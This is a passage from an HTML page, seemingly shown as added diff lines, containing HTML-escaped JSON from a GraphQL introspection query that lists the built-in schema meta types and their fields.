&quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;ofType&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isOneOf&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__TypeKind&quot;, &quot;kind&quot;: &quot;ENUM&quot;, &quot;fields&quot;: null}, {&quot;name&quot;: &quot;__Field&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;args&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;type&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__InputValue&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;type&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;defaultValue&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__EnumValue&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__Directive&quot;, &quot;kind&quot;: &quot;OBJECT&quot;, &quot;fields&quot;: [{&quot;name&quot;: &quot;name&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;description&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;isRepeatable&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;locations&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;args&quot;, &quot;args&quot;: [{&quot;name&quot;: &quot;includeDeprecated&quot;, &quot;type&quot;: {&quot;name&quot;: &quot;Boolean&quot;, &quot;kind&quot;: &quot;SCALAR&quot;, &quot;ofType&quot;: null}}]}, {&quot;name&quot;: &quot;isDeprecated&quot;, &quot;args&quot;: []}, {&quot;name&quot;: &quot;deprecationReason&quot;, &quot;args&quot;: []}]}, {&quot;name&quot;: &quot;__DirectiveLocation&quot;, &quot;kind&quot;: &quot;ENUM&quot;, &quot;fields&quot;: null}]}}}</pre></div>
+</div>
+</body></html>
